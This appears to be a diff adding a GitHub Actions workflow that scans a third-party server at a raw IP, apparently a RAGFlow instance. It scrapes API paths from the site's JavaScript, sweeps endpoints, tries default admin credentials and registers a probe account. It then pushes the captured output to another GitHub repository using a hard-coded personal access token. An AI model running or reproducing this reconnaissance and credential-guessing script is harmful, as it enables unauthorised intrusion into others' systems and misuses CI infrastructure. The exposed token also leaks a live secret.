@@ -1,0 +1,43 @@
+name: ul5685rag2
+on: workflow_dispatch
+permissions:
+  contents: write
+jobs:
+  r:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: rag2
+        run: |
+          set +e
+          exec > /tmp/rep 2>&1
+          R=http://123.184.7.135:18080
+          echo "=== bundle api refs"
+          curl -s -m 15 "$R/entry/js/index-C2Axc-oG.js" -o /tmp/j1 -w 'j1 %{http_code} %{size_download}\n'
+          grep -oE '(api/v1|/v1)/[a-zA-Z0-9_/.-]{2,50}' /tmp/j1 | sort | uniq -c | sort -rn | head -30
+          grep -oE '"[a-z]+/[a-z0-9_/.-]*login[a-z0-9_/.-]*"' /tmp/j1 | sort -u | head
+          grep -oE '/api/[a-zA-Z0-9_/.-]{2,40}' /tmp/j1 | sort | uniq -c | sort -rn | head -30
+          echo "=== endpoint matrix"
+          for base in /api/v1 /v1; do
+            for p in /user/login /user/register /system/version /system/status /datasets /agents /chats; do
+              c=$(curl -s -o /tmp/x -m 6 -w '%{http_code}' "$R$base$p")
+              echo "GET $base$p -> $c $(head -c 100 /tmp/x | tr -d '\n')"
+            done
+          done
+          echo "=== login/register POST"
+          for base in /api/v1 /v1; do
+            echo "-- $base/user/login"
+            curl -s -m 8 -X POST -H 'Content-Type: application/json' -d '{"email":"admin@ragflow.io","password":"admin"}' "$R$base/user/login" -w '\n  %{http_code}\n' | head -c 300; echo
+            echo "-- $base/user/register"
+            curl -s -m 8 -X POST -H 'Content-Type: application/json' -d '{"nickname":"ul5685","email":"ul5685@probe.local","password":"Ul5685#Probe!2026"}' "$R$base/user/register" -w '\n  %{http_code}\n' | head -c 300; echo
+          done
+          echo "=== login page"
+          curl -s -m 10 "$R/login" -o /tmp/lp -w 'lp %{http_code} %{size_download}\n'
+          grep -oE 'v0\.[0-9]+\.[0-9]+' /tmp/lp | head
+          echo DONE
+          B64=$(base64 -w0 /tmp/rep)
+          SHA=$(curl -s -H "Authorization: token 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" "https://api.github.com/repos/dongsuju/ul-plant/contents/ul5685/out_rag2.txt?ref=main" | python3 -c 'import sys,json
+try: d=json.load(sys.stdin); print(d.get("sha","") if isinstance(d,dict) else "")
+except: print("")')
+          python3 -c "import json,sys;b={'message':'out','content':sys.argv[1],'branch':'main'};b.update({'sha':sys.argv[2]} if sys.argv[2] else {});open('/tmp/pb.json','w').write(json.dumps(b))" "$B64" "$SHA"
+          curl -s -X PUT -H "Authorization: token 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" -H 'Content-Type: application/json' --data @/tmp/pb.json "https://api.github.com/repos/dongsuju/ul-plant/contents/ul5685/out_rag2.txt" -o /dev/null -w 'put=%{http_code}\n'
